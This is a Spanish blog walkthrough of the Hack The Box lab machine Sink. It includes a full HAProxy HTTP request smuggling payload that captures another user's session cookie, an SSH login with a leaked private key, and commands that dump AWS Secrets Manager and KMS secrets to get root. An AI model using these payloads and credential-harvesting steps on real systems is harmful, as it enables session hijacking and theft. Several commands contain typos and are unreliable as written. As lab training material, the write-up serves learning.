---
layout: post
title: HTB_Sink
date: 2023/07/10
slug: HTB_Sink
heroImage: /assets/machines.jpg
---

# Sink {-}

## Introduccion {-}

La maquina del dia se llama Sink.

El replay del live se puede ver aqui

[![S4vitaar Sauna maquina](https://img.youtube.com/vi/fhI1MDL_nSo/0.jpg)](https://www.youtube.com/watch?v=fhI1MDL_nSo)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.225
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.225
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.225 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,3000,5000 10.10.10.225 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 22     | ssh      | Coneccion directa  |            |
| 3000   | http     | Web Fuzzing        |            |
| 5000   | https    | Web Fuzzing        |            |


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.225:3000
whatweb http://10.10.10.225:5000
```

Vemos en el puerto 3000 informacion que habla de un git un poco como un github. Y en el puerto 5000 vemos un password field que parece ser un
panel de inicio de session.

#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.225:3000 
```
, El wappalizer no nos muestra nada. Si entramos con la url 
```bash
 http://10.10.10.225:5000 
```
 vemos el panel de inicio de
session y el wappalizer tampoco no dice nada.

El puerto 3000 nos muestra un GITEA, intentamos cosas como XSS, Regex y SQLi en el input del menu Explorar, pero no vemos nada. En usuarios vemos 3 usuarios:

- david
- marcus
- root

Si pinchamos en los links de los usuarios no vemos nada. Tambien vemos que no nos podemos registrar. Intentamos loggearnos como 
```bash
 david:david 
```
, 
```bash
 marcus:marcus 
```
 y 
```bash
 root:root 
```
 pero nada.

En la pagina del puerto 5000, nos podemos registrar. Creamos un usuario y entramos en una web. miramos si podemos hacer cosas como htmlI, XXS, pero no vemos nada. Lo unico seria
en la pagina 
```bash
 http://10.10.10.225:5000/notes 
```
 que podriamos Fuzzear para ver notas.

Lanzamos Burpsuite para ver como se transmitten las peticiones. Pero no vemos nada interesantes aqui.





## Vulnerability Assessment {-}

### HTTP Request Smuggling {-}

Como no hemos encontrado nada analyzando la web manualmente, analyzamos las cabezeras con curl

```bash
curl -X GET -I http://10.10.10.225:5000/home
curl -X GET -I http://10.10.10.225:5000/home -L
```

Aqui vemos que estamos frente a un gunicorn que pasa 
```bash
 haproxy 
```
. Miramos por google que es y si existen vulnerabilidades. Encontramos una vulnerabilidad
liada a 
```bash
 haproxy 
```
 que es un **HTTP Request Smuggling**. Esta vulnerabilidad esta bien contemplada en la web de [portswigger](https://portswigger.net/web-security/request-smuggling).
Esta vulnerabilidad basicamente permitte enviar 2 peticiones al mismo tiempo y permitteria burlar las seguridades con esta segunda peticion.
En el caso de 
```bash
 haproxy 
```
 podemos ver esta vulnerabilidad en la pagina de [nathanvison](https://nathandavison.com/blog/haproxy-http-request-smuggling).

Para explotar esta vulnerabilidad vamos a utilizar el Burpsuite.

```bash
POST /comment HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencode
Content-Length: 10
Cookie: lang=es-ES; i_like_gitea=604fd0a0f47a3b62; _csrf=4/PDrYQpzOFpi6ZlhMOToLe6YnY6MTYzMTk5NTE4zUONzY2NzY2Mg;
 redirect_to=&2Froot; session=eyJlbWFpbCI6InMOdmlOyXJaczR2aXRhci5jb20ifQ.YU2HdQ.qlIPX6awl0v1C8A8UXGUHfLXFJo
Transfer-Encoding:[\x0b]chunked

0

POST /comment HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencode
Content-Length: 10
Cookie: lang=es-ES; i_like_gitea=604fd0a0f47a3b62; _csrf=4/PDrYQpzOFpi6ZlhMOToLe6YnY6MTYzMTk5NTE4zUONzY2NzY2Mg;
 redirect_to=&2Froot; session=eyJlbWFpbCI6InMOdmlOyXJaczR2aXRhci5jb20ifQ.YU2HdQ.qlIPX6awl0v1C8A8UXGUHfLXFJo

msg=Adios


```

> [ ! ] Notas: Es possible que tengamos que encodear en base64 el 
```bash
 [\x0b] 
```
 antes de ponerla en el burpsuite y tenemos que darle al Follow redirect en este caso.

Aqui podemos ver que hemos podido enviar 2 peticiones al mismo tiempo, una nos da el mensaje **None** y la segunda nos sale **Adios**, lo que significa que
es vulnerable a **HTTP Request Smuggling**.

Intentamos cosas y nos damos cuenta que si agregamos mas content length a la segunda request podemos ver parte de la request del delete.


```bash
POST /comment HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencode
Content-Length: 10
Cookie: lang=es-ES; i_like_gitea=604fd0a0f47a3b62; _csrf=4/PDrYQpzOFpi6ZlhMOToLe6YnY6MTYzMTk5NTE4zUONzY2NzY2Mg;
 redirect_to=&2Froot; session=eyJlbWFpbCI6InMOdmlOyXJaczR2aXRhci5jb20ifQ.YU2HdQ.qlIPX6awl0v1C8A8UXGUHfLXFJo
Transfer-Encoding:[\x0b]chunked

0

POST /comment HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencode
Content-Length: 50
Cookie: lang=es-ES; i_like_gitea=604fd0a0f47a3b62; _csrf=4/PDrYQpzOFpi6ZlhMOToLe6YnY6MTYzMTk5NTE4zUONzY2NzY2Mg;
 redirect_to=&2Froot; session=eyJlbWFpbCI6InMOdmlOyXJaczR2aXRhci5jb20ifQ.YU2HdQ.qlIPX6awl0v1C8A8UXGUHfLXFJo

msg=a


```

Si ponemos 
```bash
 Content-Length: 300 
```
 podemos ver una cookie de session que no es la misma que la nuestra.
Cambiamos la cookie en el Firefox y vamos a 
```bash
 /notes 
```
 podemos ver notas differentes que contienen credenciales para nuevos **Hosts** que añadimos al 
```bash
 /etc/hosts 
```
.

Intentamos ir a las urls:
    - 
```bash
 http://chef.sink.htb:3000 
```

    - 
```bash
 http://chef.sink.htb:5000 
```

    - 
```bash
 http://code.sink.htb:3000 
```

    - 
```bash
 http://code.sink.htb:5000 
```

    - 
```bash
 http://nagios.sink.htb:3000 
```

    - 
```bash
 http://nagios.sink.htb:5000 
```


pero no vemos ninguna differencia. Podria ser un puerto 80 interno. Intentamos connectarnos por **ssh** con las credentiales encontradas pero no podemos connectarnos.


Una de las credenciales nos llama la atencion porque son credenciales del usuario **root** y recordamos haber visto un usuario root en el **GITEA**.
Si vamos a la url 
```bash
 http://10.10.10.225:3000 
```
 y nos conectamos con las credenciales de **root**.









## Vuln exploit & Gaining Access {-}

### GITEA Git commits history {-}

Loggeado como el usuario **root** nos permitte ver 4 repositorios. Aqui tenemos que analyzar los differentes repositorios que nos permitte encontrar
nuevos puertos internos, un proyecto 
```bash
 elastic_search 
```
, un repositorio 
```bash
 Log_Manager 
```
 que contiene informaciones sobre un **aws** y otras informaciones mas.

Uno de los proyecto es el **Key_Management** que es archivado, y que contiene commits hechos por el usuario marcus. Uno de estos commits contiene una 

```bash
 Private key 
```
.

Copiamos la llave y le ponemos derechos **600**, nos podemos connectar por 
```bash
 ssh 
```
 como el usuario 
```bash
 marcus 
```
.

```bash
chmod 600 id_rsa
ssh -i id_rsa marcus@10.10.10.225
```

Aqui podemos ver que hemos ganado accesso al systema y que podemos leer la flag.


## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami
ls
id
sudo -l
pwd
find \-type f 2>/dev/null
```

buscamos para puertos abiertos

```bash
netstat -nat
```

aqui vamos a pasar por 
```bash
 /proc/net/tcp 
```
 y passar de **hex** a **decimal** con bash.

1. Copiamos el 
```bash
 /proc/net/tcp 
```
 en un fichero data_hex

    ```bash
    cat /proc/net/tcp
    ```

1. recuperamos los puertos

    ```bash
    cat data_hex | awk '{print $2}'
    cat data_hex | awk '{print $2}' | tr ':' ' '
    cat data_hex | awk '{print $2}' | tr ':' ' ' | awk 'NF{print $NF}'
    cat data_hex | awk '{print $2}' | tr ':' ' ' | awk 'NF{print $NF}' | sort -u
    ```

1. Passamos del hexadecimal al decimal con bash

    ```bash
    for hex_port in $(cat data_hex | awk '{print $2}' | tr ':' ' ' | awk 'NF{print $NF}' | sort -u); do echo "obase=10; ibase=16; $hex_port" | bc; done
    ```

Continuamos la enumeracion

```bash
cd /
find \-perm -4000 2>/dev/null
ls -la /var
ls -la /opt
ls -la /opt/containerd
ps -faux
ifconfig

cat /home/bot/bot.py
```
El 
```bash
 ps -faux 
```
 nos muestra un commando python a un fichero que no existe en esta maquina. Pensamos en un docker o algo parecido.
Aqui no vemos nada interessante. Vamos a crearnos un procmon en bash

```bash
cd /dev/shm
touch procmon.sh
chmod +x procmon.sh
vi procmon.sh
```

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command|kworker"
    old_process=$new_process
done
```

Aqui tampoco vemos nada interessante. Miramos si tenemos binarios installados que corresponden a lo que hemos encontrado en el **GITEA**.

```bash
which aws
```

Vemos que tenemos **aws** installado y en un commit del repository 
```bash
 Log_Manager 
```
 podemos ver credenciales con un secret contra un endpoint en el puerto 4566.

```bash
netstat -nat | grep "4566"

aws help
aws secrectsmanager help
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets
```

Aqui vemos que tenemos primero que configurar el commando aws.

```bash
aws configure

AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key [None]: 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
Default region name [None]: eu
Default option format [None]:

aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets
```

Aqui ya podemos listar los secretos y recuperamos la data interesante

```bash
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN"
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN" | grep -v "RotationLambdaARN"
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN" | grep -v "RotationLambdaARN" | grep -oP '".*?"'
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN" | grep -v "RotationLambdaARN" | grep -oP '".*?"' | grep -v "ARN"
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN" | grep -v "RotationLambdaARN" | grep -oP '".*?"' | grep -v "ARN" | tr -d '"'
```

Ahora que tenemos un listado de **ARN** podemos usar del commando 
```bash
 get-secret-value 
```
 para cada **ARN**.

```bash
#!/bin/bash

aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN" | grep -v "RotationLambdaARN" | grep -oP '".*?"' | grep -v "ARN" | tr -d '"' while read aws_secret_key; do
    echo -e "\n[+] Mostrando secreto con el secret_key $aws_secret_key:\n"
    aws --endpoint-url="http://127.0.0.1:4566" secretsmanager get-secret-value --secret-id "$aws_secret_key"
done
```

Aqui podemos ver credenciales y como el usuario **david** esta en el systema intentamos con la credencial encontrada

```bash
su david
Password: EALB=bcC=`a7f2#k
```

Ya hemos podido pivotar al usuario **david** y vemos que en su directorio tiene un proyecto con un fichero encodeado. Vamos a intentar decodearlo con
**aws**.

```bash
cd Projects/Prod_Deployment
aws --endpoint-url="http://127.0.0.1:4566" kms list-keys


aws configure

AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key [None]: 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
Default region name [None]: eu
Default option format [None]:

aws --endpoint-url="http://127.0.0.1:4566" kms list-keys
```

Si miramos la funccionalidad de decrypt del aws, vemos que necessitamos una key_id para desencryptar un fichero.

```bash
aws --endpoint-url="http://127.0.0.1:4566" kms list-keys | grep -i "keyid"
aws --endpoint-url="http://127.0.0.1:4566" kms list-keys | grep -i "keyid" | awk 'NF{print $NF}'
aws --endpoint-url="http://127.0.0.1:4566" kms list-keys | grep -i "keyid" | awk 'NF{print $NF}' | tr -d '"'
aws --endpoint-url="http://127.0.0.1:4566" kms list-keys | grep -i "keyid" | awk 'NF{print $NF}' | tr -d '"' | tr -d ','
```

Vamos a crear otro script para desencryptar el fichero.

```bash
touch decryptor.sh
chmod +x !$
nano decryptor.sh


#!/bin/bash

declare -a algorithms=(SYMMETRIC_DEFAULT RSAES_OAEP_SHA_1 RSAES_OAEP_SHA_256)

for algo in "${algorithms[@]}"; do
    aws --endpoint-url="http://127.0.0.1:4566" kms list-keys | grep -i "keyid" | awk 'NF{print $NF}' | tr -d '"' | tr -d ',' | while read key_id; do
        echo -e "\n[+] Probando con el algoritmo $algo la key $key_id:\n"
        aws --endopoint="http://127.0.0.1:4566 kms decrypt --encryption-algorithm $algo --ciphertext-blob fileb:///home/david/Projects/Prod_Deployement/servers.enc --key-id "$key_id"
    done
done
```

Lanzamos el script y vemos el resultado que es un plaintext en base64. Lo desencryptamos en un fichero, y con el commando 
```bash
 file 
```
 vemos que el fichero es un gzip.

```bash
echo "..." | base64 -d > file
file file
mv file file.gz
which gunzip
gunzip file.gz
cat file
```

Aqui vemos una contraseña y probamos si es la contraseña del usuario root

```bash
su root
Password: _uezduQ!EY5AHfe2
```

Somos root y podemos ver la flag

